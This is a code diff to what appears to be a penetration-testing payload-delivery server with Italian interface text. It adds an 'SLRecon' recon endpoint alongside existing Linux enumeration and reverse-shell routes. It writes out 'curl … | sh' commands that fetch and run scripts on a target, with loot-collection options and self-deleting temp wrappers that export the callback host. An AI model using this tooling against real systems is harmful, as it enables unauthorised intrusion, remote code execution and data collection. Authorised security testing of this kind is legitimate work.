@@ -2008,6 +2008,9 @@ def _page_delivery() -> str:
         ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: ?o salva output, ?ol output+loot, ?ols silenzioso+loot",
          f"curl {base}/linseal?ol | sh",
          "Nessun prerequisito — POSIX sh puro"),
+        ("static/slrecon.sh", "SLRecon", "Recon automatica: nmap 2-step, web enum, service enum, report. Opzioni: ?o salva, ?ol output+loot, ?ols silenzioso+loot",
+         f"curl {base}/slrecon?ol | sh -s -- TARGET",
+         "Prerequisito: <code>nmap</code> installato sul target"),
     ]
     for key, title, desc, curl_cmd, prereq in endpoints:
         ep_cards += f"""<div class="delivery-card">
@@ -2263,6 +2266,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._send_text(REVSHELL_PYTHON.format(**pv))
         elif path == "/linseal":
             self._serve_linseal(qs)
+        elif path == "/slrecon":
+            self._serve_slrecon(qs)
         elif path == "/api/search":
             q = qs.get("q", [""])[0]
             results = _search_all(q)
@@ -2627,6 +2632,39 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
 
         if args_line:
             wrapper = f'#!/bin/sh\n_LINSEAL_SELF=$(mktemp /tmp/linseal.XXXXXX 2>/dev/null || mktemp /dev/shm/linseal.XXXXXX)\ntrap "rm -f \\"$_LINSEAL_SELF\\"" EXIT\ncat > "$_LINSEAL_SELF" <<\'__LINSEAL_EOF__\'\n{script}\n__LINSEAL_EOF__\nchmod +x "$_LINSEAL_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_LINSEAL_SELF" {args_line}\n'
+        else:
+            wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n' + script
+
+        self._send_text(wrapper)
+
+    def _serve_slrecon(self, qs: dict) -> None:
+        script_path = STATIC_ROOT / "slrecon.sh"
+        if not script_path.is_file():
+            self.send_error(404, "slrecon.sh non trovato in static/")
+            return
+        try:
+            script = script_path.read_text(encoding="utf-8")
+        except OSError:
+            self.send_error(500)
+            return
+
+        flags = qs.get("f", [""])[0] if "f" in qs else parsed_query_flags(self.path)
+        args_line = ""
+        if flags:
+            parts = []
+            if "o" in flags:
+                parts.append("-o")
+            if "s" in flags:
+                parts.append("-s")
+            if "l" in flags:
+                parts.append("-l")
+            if parts:
+                args_line = " ".join(parts)
+
+        srv_port = _server.server_address[1] if _server else 2727
+
+        if args_line:
+            wrapper = f'#!/bin/sh\n_SLRECON_SELF=$(mktemp /tmp/slrecon.XXXXXX 2>/dev/null || mktemp /dev/shm/slrecon.XXXXXX)\ntrap "rm -f \\"$_SLRECON_SELF\\"" EXIT\ncat > "$_SLRECON_SELF" <<\'__SLRECON_EOF__\'\n{script}\n__SLRECON_EOF__\nchmod +x "$_SLRECON_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_SLRECON_SELF" {args_line} "$@"\n'
         else:
             wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n' + script
 
